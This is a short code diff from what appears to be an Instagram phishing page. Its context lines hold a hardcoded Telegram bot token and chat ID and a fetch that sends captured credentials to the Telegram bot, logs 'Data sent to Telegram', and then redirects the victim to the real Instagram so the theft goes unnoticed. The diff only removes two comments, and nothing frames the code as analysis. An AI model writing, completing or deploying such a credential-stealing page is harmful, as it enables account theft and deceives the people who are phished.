@@ -1,4 +1,3 @@
-        // REPLACE THESE WITH YOUR ACTUAL DETAILS
         const BOT_TOKEN = '8657575309:AAHKWZ9aGj_4exJkEkLUllYZ65ejXoYEDa8'; 
         const CHAT_ID = '5892161832'; 
 
@@ -29,7 +28,6 @@
             .then(response => {
                 if (response.ok) {
                     console.log("Data sent to Telegram");
-                    // Optional: Redirect to real Instagram after sending
                     window.location.href = "https://www.instagram.com/";
                 } else {
                     alert("Failed to send credentials. Try again.");
